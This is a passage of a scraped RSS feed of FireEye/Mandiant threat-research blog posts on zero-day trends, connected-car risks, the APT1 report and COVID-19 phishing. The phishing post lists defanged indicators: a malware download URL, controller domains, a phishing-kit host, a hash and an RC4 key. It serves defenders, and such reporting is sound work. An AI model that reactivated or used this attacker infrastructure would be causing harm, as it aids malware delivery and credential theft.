years, we were&nbsp;able to distinguish when attacker use of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html\">zero-days</a> evolved from use by a select class&nbsp;of highly skilled attackers, to becoming accessible to less skilled groups with enough money to burn. Our observations consistently underscore the <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/time-between-disclosure-patch-release-and-vulnerability-exploitation.html\">speed</a> with which attackers exploit useful vulnerabilities, and the lack of exploitation for vulnerabilities that are hard to use or do not help attackers fulfill their objectives.&nbsp;Our understanding of the threat landscape helps us to discern between hundreds of newly disclosed vulnerabilities to provide ratings and assessments that empower network defenders to focus on the most significant threats and effectively mitigate risk to their organizations.</p> \n<p>Mandiant Threat Intelligence enables organizations to implement a defense-in-depth approach to holistically mitigate risk by taking all feasible steps—not just patching—to prevent, detect, and stymie attackers at every stage of the attack lifecycle with both technology and human solutions.</p> \n<p>Register today&nbsp;to hear FireEye Mandiant Threat Intelligence experts discuss the latest in&nbsp;<a href=\"https://www.brighttalk.com/webcast/7451/392772\">vulnerability threats, trends and recommendations</a>&nbsp;in our upcoming April 30 webinar.</p> \n<p> <b>Additional Resources</b></p> \n<p> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html\">Zero-Day Exploitation Increasingly Demonstrates Access to Money, Rather than Skill — Intelligence for Vulnerability Management, Part One</a></p> \n<p> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/time-between-disclosure-patch-release-and-vulnerability-exploitation.html\">Think Fast: Time Between Disclosure, Patch Release and Vulnerability Exploitation — Intelligence for Vulnerability Management, Part Two</a></p> \n<p> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/how-mandiant-intelligence-rates-vulnerabilities.html\">Separating the Signal from the Noise: How Mandiant Intelligence Rates Vulnerabilities — Intelligence for Vulnerability Management, Part Three</a></p> \n<p>Mandiant offers <a href=\"https://www.fireeye.com/solutions/cyber-threat-intelligence.html\">Intelligence Capability Development (ICD) services</a> to help organizations optimize their ability to consume, analyze and apply threat intelligence.</p> \n<p>The&nbsp;<a href=\"https://fireeye.market/apps?query=five\">FIVE tool is available on the FireEye Market</a>. It requires a valid subscription for Mandiant Vulnerability Intelligence, and is driven from an API integration. Please contact your Intelligence Enablement Manager or FireEye Support to obtain API keys.&nbsp;</p> \n<p>Mandiant's OT Asset Vulnerability Assessment Service informs customers of relevant vulnerabilities by matching&nbsp;a customer's asset list against&nbsp;vulnerabilities and advisories. Relevant vulnerabilities and advisories are delivered in&nbsp;a report&nbsp;from as little as once a year, to as often as once a&nbsp;week. Additional add-on services such as asset inventory development and&nbsp;deep dive analysis of critical assets are available. Please contact your Intelligence Enablement Manager for more information.</p>","descriptionType":"html","publishedDate":"Mon, 27 Apr 2020 12:30:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture1.png","linkMd5":"9973cd4f93b480ccdf9f80c6d1efb385","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn15@2020_1/2020/08/24/14-11-06-378_bc4d0c3cd781c9bc.webp","destWidth":932,"destHeight":866,"sourceBytes":220830,"destBytes":46038,"author":"Katie Bowen","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn15@2020_1/2020/08/24/14-11-06-378_bc4d0c3cd781c9bc.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn27@2020_3/2020/08/24/14-11-20-228_22419d3248251d6c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn27@2020_5/2020/08/24/14-11-18-234_512543a739b927b9.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn45@2020_2/2020/08/24/14-11-20-229_c4c7e01fe0b3e2cb.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn83@2020_3/2020/08/24/14-11-20-102_51478667f49d3c55.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture6.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn24@2020_1/2020/08/24/14-11-16-142_8cc26e37f543d1aa.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture7.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn53@2020_3/2020/08/24/14-11-15-747_1f3fa54bcf633d3d.webp"},"publishedOrCreatedDate":1598278264183},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Connected Cars: The Open Road for Hackers","link":"http://www.fireeye.com/blog/threat-research/2016/06/connected_cars_the.html","description":"<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/autoreport-blog.jpg\" /></p> \n<p>As vehicles become both increasingly complex and better connected to the Internet, their newfound versatility may be manipulated for malicious purposes. Three of the most concerning potential threats looking ahead to the next few years are those posed by <b> <i>manipulating vehicle</i> <i>operation</i></b>,<b> <i>ransomware</i></b> and using vehicular systems as <b> <i>command and control (C2) infrastructure</i></b> for illicit cyber activity.</p> \n<h5> <b>Car Hacking?</b></h5> \n<p>Vehicles have come a long way in terms of the high-tech features and connectivity that come standard in most new models. Modern cars are controlled almost entirely by software, and many drivers don’t realize the most complex digital device they own may be in their <a href=\"http://www.nytimes.com/2015/09/27/business/complex-car-software-becomes-the-weak-spot-under-the-hood.html\">driveway</a>. Of the growing number of devices in the “Internet of Things” (IoT), vehicles are among the most significant additions to the global Internet. An ever-growing list of features—including web browsing, Wi-Fi access points, and remote-start mobile phone apps—enhance user enjoyment, but also greatly expand vehicles’ attack surface, rendering them potentially vulnerable to advanced attacks. During the past year especially, numerous proof-of-concept demonstrations have revealed connected-car vulnerabilities that malicious actors can exploit, ranging from unauthorized entry to <a href=\"https://www.wired.com/2015/07/hackers-remotely-kill-jeep-highway/\">commandeering the vehicle’s operation</a>. Unfortunately, as consumer demand drives ever more features, the opportunities for compromise will increase as well.</p> \n<h5> <b>Ransomware</b></h5> \n<p>The scourge of ransomware has so far affected thousands of systems belonging to ordinary individuals, hospitals, and police stations. A vehicle’s increased connectivity, ever-expanding attack surface, and high upfront cost make them attractive ransomware targets. In contrast to ransomware that infects ordinary computer systems, vehicles are more likely susceptible to ransomware attacks when their disablement causes knock-on effects.</p> \n<p>For example, where a single driver might be able to reinstall his car’s software with the help of a mechanic to remedy a ransomware infection, a group of vehicles disabled on a busy highway could cause far more serious disruption. Victims or municipal authorities may have little choice but to pay the ransom to reopen a busy commuting route. Alternatively, a logistics company might suddenly find a large portion of its truck fleet rendered useless by ransomware. The potential for lost revenue due to downtime might pressure the company to pay the ransom rather than risk more significant financial losses.</p> \n<h5> <b>Malicious C2 and Final Hop Points</b></h5> \n<p>One effective law enforcement tactic in countering cyber espionage and criminal campaigns is identifying, locating and seizing the systems threat actors use to route malicious traffic through the Internet. Since many modern vehicles can be better described as a computer attached to four wheels and an engine, their mobility and power present challenges to this means of countering threat activity. We have already witnessed malware designed to hijack IoT devices for malicious purposes; vehicular systems’ greater computing power, compared to connected home thermostats, can significantly enhance their value as a <a href=\"https://www.akamai.com/us/en/about/news/press/2014-press/akamai-warns-of-large-ddos-attacks-from-spike-ddos-toolkit.jsp\">C2 node</a>.</p> \n<p>Locating vehicles used to route malicious traffic would present a major challenge to law enforcement investigation, largely due to their mobility. We have not yet observed threat actors using connected vehicle systems to route malicious traffic, but it is most likely that a vehicle would be used as a final hop point to the intended target network. The perpetrators may use the vehicle only once, choosing to hijack the connectivity of a different vehicle on their next operation, and so on. This ever-changing roster of potential last-hop nodes situated on highly mobile platforms may allow threat actors to elude law enforcement for extended periods of time.</p> \n<h5> <b>Understanding the Risk Landscape</b></h5> \n<p>The impact of cyber threats is most often considered in financial terms—the cost of a breach, whether direct financial losses or indirect costs of investigation, remediation, and improved security. As computers increasingly control vehicles, among other critical devices and systems, the potential for malfunction or manipulation that causes human harm rises dramatically. Automobile manufacturers may face greater liability, not only for the car’s physical components, but its software as well. How long before vehicles need a “cyber security rating,” similar to that awarded for crash testing and fuel economy?</p> \n<p>These new risks point to the need for automotive manufacturers and suppliers to not only ensure the traditional operational safety of their vehicles, but to also secure both the vehicle's operations and occupant privacy. This requires an ongoing understanding about the nature of threats and vulnerabilities in a rapidly evolving landscape, and building in strong proactive security measures to protect against these risks.<i> </i>FireEye explores these risks to automotive safety in our latest FireEye iSIGHT Intelligence and Mandiant Consulting report: <i>Connected Cars: The Open Road for Hackers</i>. The report is <a target=\"_blank\" href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/connected-cars-the-open-road-for-hackers.pdf\">available for download here.</a></p> \n<h5> <b> <i>FireEye Capabilities</i></b></h5> \n<p> <i>FireEye combines our industry leading <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products-delete/dynamic-threat-intelligence.html\">threat intelligence</a>, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\">incident response</a> and red team capabilities with our ICS domain expertise to help the automotive industry improve their prevention, detection and response capabilities. FireEye’s <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/red-team-operations.html\">Red Team Operations</a> and <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/penetration-testing.html\">Penetration Tests</a> can provide firms in the automotive industry experience responding to real-world attacks without the risk of negative headlines. A one-time risk assessment is not enough, because threat attackers are consistently evolving.</i></p> \n<p> <i>For more information, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/company/contact-us.html\">contact FireEye</a>.</i></p> \n<p> <i>FireEye iSIGHT Intelligence’s Horizons Team conducts strategic forecasting to anticipate risks posed by emerging technologies and geopolitical developments, helping clients and the public better assess their exposure to a dynamic cyber threat landscape.</i></p>","descriptionType":"html","publishedDate":"Fri, 10 Jun 2016 14:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/autoreport-blog.jpg","linkMd5":"5d4e43fc9aa35529b732eab25ced9f19","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn3@2020_4/2020/08/24/14-11-04-868_4e59a3f31efa6cbf.webp","destWidth":888,"destHeight":385,"sourceBytes":84028,"destBytes":58812,"author":"Will Glass","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/autoreport-blog.jpg":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn3@2020_4/2020/08/24/14-11-04-868_4e59a3f31efa6cbf.webp"},"publishedOrCreatedDate":1598278264198},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Mandiant Exposes APT1 – One of China's Cyber Espionage Units &amp;\nReleases 3,000 Indicators","link":"http://www.fireeye.com/blog/threat-research/2013/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html","description":"<div class=\"c00 c00v1\"> \n <p>Today, The Mandiant® Intelligence Center™ released an <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/current-threats/annual-threat-report.html\">unprecedented report</a> exposing APT1's multi-year, enterprise-scale computer espionage campaign. APT1 is one of dozens of threat groups Mandiant tracks around the world and we consider it to be one of the most prolific in terms of the sheer quantity of information it has stolen.</p> \n <p>Highlights of the report include:</p> \n <ul> \n  <li>Evidence linking APT1 to China's 2nd Bureau of the People's Liberation Army (PLA) General Staff Department's (GSD) 3rd Department (Military Cover Designator 61398).</li> \n  <li>A timeline of APT1 economic espionage conducted since 2006 against 141 victims across multiple industries.</li> \n  <li>APT1's modus operandi (tools, tactics, procedures) including a compilation of <a href=\"http://youtu.be/6p7FqSav6Ho\">videos</a> showing actual APT1 activity.</li> \n  <li>The timeline and details of over 40 APT1 malware families.</li> \n  <li>The timeline and details of APT1's extensive attack infrastructure.</li> \n </ul> \n <p>Mandiant is also releasing a digital appendix with more than 3,000 indicators to bolster defenses against APT1 operations. This appendix includes:</p> \n <ul> \n  <li>Digital delivery of over 3,000 APT1 indicators, such as domain names, and MD5 hashes of malware.</li> \n  <li>Thirteen (13) X.509 encryption certificates used by APT1.</li> \n  <li>A set of APT1 Indicators of Compromise (IOCs) and detailed descriptions of over 40 malware families in APT1's arsenal of digital weapons.</li> \n  <li>IOCs that can be used in conjunction with <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline</a>™, Mandiant's free host-based investigative tool, or with <a href=\"http://www.mandiant.com/products/platform/\">Mandiant Intelligent Response® (MIR)</a>, Mandiant's commercial enterprise investigative tool.</li> \n </ul> \n <p>The scale and impact of APT1's operations compelled us to write this report. The decision to publish a significant part of our intelligence about Unit 61398 was a painstaking one. What started as a \"what if\" discussion about our traditional non-disclosure policy quickly turned into the realization that the positive impact resulting from our decision to expose APT1 outweighed the risk of losing much of our ability to collect intelligence on this particular APT group. It is time to acknowledge the threat is originating from China, and we wanted to do our part to arm and prepare security professionals to combat the threat effectively. The issue of attribution has always been a missing link in the public's understanding of the landscape of APT cyber espionage. Without establishing a solid connection to China, there will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral to larger national security and global economic concerns. We hope that this report will lead to increased understanding and coordinated action in countering APT network breaches.</p> \n <p>We recognize that no one entity can understand the entire complex picture that many years of intense cyber espionage by a single group creates. We look forward to seeing the surge of data and conversations a report like this will likely generate.</p> \n <p>Dan McWhorter</p> \n <p>Managing Director, Threat Intelligence</p> \n</div>","descriptionType":"html","publishedDate":"Tue, 19 Feb 2013 07:00:45 +0000","feedId":1226,"bgimg":"","linkMd5":"1a83e1fffbf49f4590ba380d4d943902","bgimgJsdelivr":"","metaImg":"","author":"Dan Mcwhorter","publishedOrCreatedDate":1598278264210},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Social Engineering Based on Stimulus Bill and COVID-19 Financial\nCompensation Schemes Expected to Grow in Coming Weeks","link":"http://www.fireeye.com/blog/threat-research/2020/03/stimulus-bill-social-engineering-covid-19-financial-compensation-schemes.html","description":"<p>Given the community interest and media coverage surrounding the\n  economic stimulus bill currently being considered by the United States\n  House of Representatives, we anticipate attackers will increasingly\n  leverage lures tailored to the new stimulus bill and related recovery\n  efforts such as stimulus checks, unemployment compensation and small\n  business loans. Although campaigns employing themes relevant to these\n  matters are only beginning to be adopted by threat actors, we expect\n  future campaigns—primarily those perpetrated by financially motivated\n  threat actors—to incorporate these themes in proportion to the media’s\n  coverage of these topics.</p>\n <p>Threat actors with varying motivations are actively exploiting the\n  current pandemic and public fear of the coronavirus and COVID-19. This\n  is consistent with our expectations; malicious actors are typically\n  quick to adapt their social engineering lures to exploit major\n  flashpoints along with other recurrent events (e.g. holidays,\n  Olympics). Security researchers at FireEye and <a\n    href=\"https://twitter.com/1ZRR4H/status/1240442939421200390\">in the\n    broader community</a> have already begun to identify and report on\n  COVID-19 themed campaigns with grant, payment, or economic recovered\n  themed emails and attachments.</p>\n <h4>Example Malware Distribution Campaign<b></b></h4>\n <p>On March 18, individuals at corporations across a broad set of\n  industries and geographies received emails with the subject line\n  “COVID-19 Payment” intended to distribute the SILENTNIGHT banking\n  malware (also referred to by others as Zloader). Despite the\n  campaign’s broad distribution, a plurality of associated messages were\n  sent to organizations based in Canada. Interestingly, although the\n  content of these emails was somewhat generic, they were sometimes\n  customized to reference a payment made in currency relevant to the\n  recipient’s geography and contextually relevant government officials\n  (Figure 1 and Figure 2). These emails were sent from a large pool of\n  different @gmx.com email addresses and had password protected\n  Microsoft Word document attachments using the file name “COVID 19\n  Relief.doc” (Figure 3). The emails appear to be auto generated and\n  follow the format\n  &lt;name&gt;.&lt;name&gt;&lt;SevenNumberString&gt;@gmx.com. When these\n  documents were opened and macros enabled, they would drop and execute\n  a .JSE script crafted to download and execute an instance of\n  SILENTNIGHT from http://209.141.54[.]161/crypt18.dll.</p>\n <p>An analyzed sample of SILENTNIGHT downloaded from this URL had an\n  MD5 hash of 9e616a1757cf1d40689f34d867dd742e, employed the RC4 key\n  'q23Cud3xsNf3', and was associated with the SILENTNIGHT botnet\n  'PLSPAM'. This botnet has been seen loading configuration files\n  containing primarily U.S.- and Canada financial institution webinject\n  targets. Furthermore, this sample was configured to connect to the\n  following controller infrastructure:</p>\n <ul> <li>http://marchadvertisingnetwork4[.]com/post.php</li>\n  <li>http://marchadvertisingnetwork5[.]com/post.php</li>\n  <li>http://marchadvertisingnetwork6[.]com/post.php</li>\n  <li>http://marchadvertisingnetwork7[.]com/post.php</li>\n  <li>http://marchadvertisingnetwork8[.]com/post.php</li>\n  <li>http://marchadvertisingnetwork9[.]com/post.php</li>\n  <li>http://marchadvertisingnetwork10[.]com/post.php</li> </ul>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture1.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 1: Example lure using CAD</span></p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture2.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 2: Example lure using AUD</span></p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture3.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 3: Malicious Word document</span></p>\n <h4>Example Phishing Campaign</h4>\n <p>Individuals at financial services organizations in the United States\n  were sent emails with the subject line “Internal Guidance for\n  Businesses Grant and loans in response to respond to COVID-19” (Figure\n  4). These emails had OpenDocument Presentation (.ODP) format\n  attachments that, when opened in Microsoft PowerPoint or OpenOffice\n  Impress, display a U.S. Small Business Administration (SBA) themed\n  message (Figure 5) and an in-line link that redirects to an Office 365\n  phishing kit (Figure 6) hosted at https://tyuy56df-kind-giraffe-ok.mybluemix[.]net/.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture4.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 4: Email lure referencing business\n    grants and loans</span></p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture5.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 5: SBA-themed message</span></p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture6.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 6: Office 365 phishing page</span></p>\n <h4>Implications</h4>\n <p>Malicious actors have always exploited users’ sense of urgency,\n  fear, goodwill and mistrust to enhance their operations. The threat\n  actors exploiting this crisis are not new, they are simply taking\n  advantage of a particularly overtaxed target set that is urgently\n  seeking new information. Users who are aware of this dynamic, and who\n  approach any new information with cautious skepticism will be\n  especially prepared to meet this challenge.</p>\n","descriptionType":"html","publishedDate":"Fri, 27 Mar 2020 19:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture1.png","linkMd5":"87ecde25963f6cc24b43fc09fa2ca09c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn5@2020_1/2020/08/24/14-11-05-248_9436d393b970b7a4.webp","destWidth":770,"destHeight":227,"sourceBytes":62549,"destBytes":17360,"author":"FireEye Mandiant Threat Intelligence","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn5@2020_1/2020/08/24/14-11-05-248_9436d393b970b7a4.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn25@2020_6/2020/08/24/14-11-17-296_c543303e307be9fc.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn42@2020_2/2020/08/24/14-11-20-091_bbca006058592a65.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn67@2020_2/2020/08/24/14-11-18-541_86e70004721da2f1.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn100@2020_3/2020/08/24/14-11-21-500_6931adcfd2bb374a.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture6.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn96@2020_5/2020/08/24/14-11-19-840_ef40945f967464a9.webp"},"publishedOrCreatedDate":1598278264185},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"M-Unition Podcast: Mandiant’s Redline Tool Makes Incident Response Easy\nfor Experts and Beginners","link":"http://www.fireeye.com/blog/threat-research/2012/08/cool-tools-mandiants-redline-tool-incident-response-easy.html","description":"<div class=\"c00 c00v1\"> \n <p>On today's podcast, Kristen Cooper talks with Lucas Zaichkowsky on the latest version of <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\" title=\"Redline\">Redline</a>, a free tool from Mandiant.</p> \n <p>The podcast will explain in detail what Redline is capable of, highlighting two features that set it apart from other tools. First, the tool is intuitive enough to be used by novice incident responders, without compromising capabilities that advanced incident responders utilize in the tool. Secondly, the tool is capable of applying Indicators of Compromise (IOC) to data that it collects. This allows Redline to detect evidence of attacks, even though there may be no evidence of active malware on additional computers.</p> \n <p>Listen along as Lucas details the product demonstration he performed at Black Hat 2012 that really showcases Redline's unique value.</p> \n <p>To listen to the full podcast and learn more about Redline click <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/redlinemandiant.mp3\">here</a>.</p> \n</div>","descriptionType":"html","publishedDate":"Thu, 16 Aug 2012 23:54:35 +0000","feedId":1226,"bgimg":"","linkMd5":"b027b69ad4678b0dd4686cbf511b434c","bgimgJsdelivr":"","metaImg":"","author":"Helena Brito","publishedOrCreatedDate":1598278264224},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Zero-Day Exploitation Increasingly Demonstrates Access to Money, Rather\nthan Skill — Intelligence for Vulnerability Management, Part One","link":"http://www.fireeye.com/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html","description":"<p> <i>One of the critical strategic and tactical roles that cyber threat intelligence (CTI) plays is in the tracking, analysis, and prioritization of software vulnerabilities that could potentially put an organization’s data, employees and customers at risk. In this four-part blog series, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\">FireEye Mandiant Threat Intelligence</a> highlights the value of CTI in enabling vulnerability management, and unveils new research into the latest threats, trends and recommendations.</i></p> \n<p>FireEye Mandiant Threat Intelligence documented more zero-days exploited in 2019 than any of the previous three years. While not every instance of zero-day exploitation can be attributed to a tracked group, we noted that a wider range of tracked actors appear to have gained access to these capabilities. Furthermore, we noted a significant increase over time in the number of zero-days leveraged by groups suspected to be customers of companies that supply offensive cyber capabilities, as well as an increase in zero-days used against targets in the Middle East, and/or by groups with suspected ties to this region. Going forward, we are likely to see a greater variety of actors using zero-days, especially as private vendors continue feeding the demand for offensive cyber weapons.</p> \n<h4>Zero-Day Usage by Country and Group</h4> \n<p>Since late 2017, FireEye Mandiant Threat Intelligence noted a significant increase in the number of zero-days leveraged by groups that are known or suspected to be customers of private companies that supply offensive cyber tools and services. Additionally, we observed an increase in zero-days leveraged against targets in the Middle East, and/or by groups with suspected ties to this region.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/intelvuln1/Picture1.png\" alt=\"\" /></p> \n<p>Examples include:</p> \n<ul> \n <li>A group described by researchers as&nbsp;<a href=\"https://citizenlab.ca/2016/05/stealth-falcon/\" title=\"https://citizenlab.ca/2016/05/stealth-falcon/\">Stealth Falcon</a>&nbsp;and&nbsp;<a href=\"https://www.securityweek.com/windows-zero-day-exploited-fruityarmor-sandcat-threat-groups\" title=\"https://www.securityweek.com/windows-zero-day-exploited-fruityarmor-sandcat-threat-groups\">FruityArmor</a>&nbsp;is an espionage group that has&nbsp;reportedly&nbsp;<a href=\"https://www.welivesecurity.com/2019/09/09/backdoor-stealth-falcon-group/\">targeted journalists and activists in the Middle East</a>. In 2016, this group used malware sold by NSO group, which leveraged three iOS zero-days. From 2016 to 2019, this group used more zero-days than any other group.</li> \n <li>The activity dubbed SandCat in open sources, suspected to be linked to <a href=\"https://www.vice.com/en_us/article/3kx5y3/uzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec\">Uzbekistan state intelligence</a>, has been observed using zero-days in operations against targets in the Middle East. This group may have acquired their zero-days by purchasing malware from private companies such as NSO group, as the zero-days used in SandCat operations were also used in Stealth Falcon operations, and it is unlikely that these distinct activity sets independently discovered the same three zero-days.</li> \n <li>Throughout 2016 and 2017, activity referred to in open sources as <a href=\"https://www.securityweek.com/middle-east-group-uses-flash-zero-day-deliver-spyware\">BlackOasis</a>, which also primarily targets entities in the Middle East and likely acquired at least one zero-day in the past from <a href=\"https://www.cyberscoop.com/middle-eastern-hacking-group-using-finfisher-malware-conduct-international-espionage/\">private company Gamma Group</a>, demonstrated similarly frequent access to zero-day vulnerabilities.</li> \n</ul> \n<p>We also noted examples of zero-day exploitation that have not been attributed to tracked groups but that appear to have been leveraged in tools provided by private offensive security companies, for instance:</p> \n<ul> \n <li>In 2019, a zero-day exploit in WhatsApp (CVE-2019-3568) was <a href=\"https://www.itpro.co.uk/spyware/33632/whatsapp-call-hack-installs-spyware-on-users-phones\">reportedly used to distribute spyware</a> developed by NSO group, an Israeli software company.</li> \n <li>FireEye analyzed activity targeting a Russian healthcare organization that leveraged a 2018 Adobe Flash zero-day (CVE-2018-15982) that may be linked to leaked source code of Hacking Team.</li> \n <li>Android zero-day vulnerability CVE-2019-2215 was <a href=\"https://thehackernews.com/2019/10/android-kernel-vulnerability.html\">reportedly being exploited in the wild</a> in October 2019 by NSO Group tools.</li> \n</ul> \n<p> <i>Zero-Day Exploitation by Major Cyber Powers</i></p> \n<p>We have continued to see exploitation of zero days by espionage groups of major cyber powers.</p> \n<ul> \n <li>According to researchers, the Chinese espionage group APT3 exploited CVE-2019-0703 in <a href=\"https://www.symantec.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit\">targeted attacks in 2016</a>.</li> \n <li>FireEye observed North Korean group APT37 conduct a 2017 campaign that leveraged Adobe Flash vulnerability CVE-2018-4878. This group has also demonstrated an increased capacity to quickly exploit vulnerabilities shortly after they have been disclosed.</li> \n <li>From December 2017 to January 2018, we observed multiple Chinese groups leveraging CVE-2018-0802 in a campaign targeting multiple industries throughout Europe, Russia, Southeast Asia, and Taiwan. At least three out of six samples were used before the patch for this vulnerability was issued.</li> \n <li>In 2017, Russian groups <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2017/05/eps-processing-zero-days.html\">APT28 and Turla leveraged multiple zero-days</a> in Microsoft Office products.&nbsp;</li> \n</ul> \n<p>In addition, we believe that some of the most dangerous state sponsored intrusion sets are increasingly demonstrating the ability to quickly exploit vulnerabilities that have been made public. In multiple cases, groups linked to these countries have been able to weaponize vulnerabilities and incorporate them into their operations, aiming to take advantage of the window between disclosure and patch application.&nbsp;</p> \n<p> <i>Zero-Day Use by Financially Motivated Actors</i></p> \n<p>Financially motivated groups have and continue to <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/05/windows-zero-day-payment-cards.html\">leverage zero-days in their operations</a>, though with less frequency than espionage groups.</p> \n<p>In May 2019, we reported that FIN6 used a Windows server 2019 use-after-free zero-day (CVE-2019-0859) in a targeted intrusion in February 2019. Some evidence suggests that the group may have used the exploit since August 2018. While open sources have suggested that the group potentially acquired the zero-day from criminal underground actor \"<a href=\"https://www.ibtimes.com/hacker-selling-windows-zero-days-worlds-most-dangerous-hacker-groups-2789374\">BuggiCorp</a>,\" we have not identified direct evidence linking this actor to this exploit's development or sale.</p> \n<h4>Conclusion</h4> \n<p>We surmise that access to zero-day capabilities is becoming increasingly commodified based on the proportion of zero-days exploited in the wild by suspected customers of private companies. Possible reasons for this include:</p> \n<ul> \n <li>Private companies are likely creating and supplying a larger proportion of zero-days than they have in the past, resulting in a concentration of zero-day capabilities among highly resourced groups.</li> \n <li>Private companies may be increasingly providing offensive capabilities to groups with lower overall capability and/or groups with less concern for operational security, which makes it more likely that usage of zero-days will be observed.</li> \n</ul> \n<p>It is likely that state groups will continue to support internal exploit discovery and development; however, the availability of zero-days through private companies may offer a more attractive option than relying on domestic solutions or underground markets. As a result, we expect that the number of adversaries demonstrating access to these kinds of vulnerabilities will almost certainly increase and will do so at a faster rate than the growth of their overall offensive cyber capabilities—provided they have the ability and will to spend the necessary funds.</p> \n<p>Register today&nbsp;to hear FireEye Mandiant Threat Intelligence experts discuss the latest in <a href=\"https://www.brighttalk.com/webcast/7451/392772\">vulnerability threats, trends and recommendations</a> in our upcoming April 30 webinar.&nbsp;</p> \n<p> <i>Sourcing Note: Some vulnerabilities and zero-days were identified based on FireEye research, Mandiant breach investigation findings, and other technical collections. This paper also references vulnerabilities and zero-days discussed in open sources including&nbsp;</i> <a 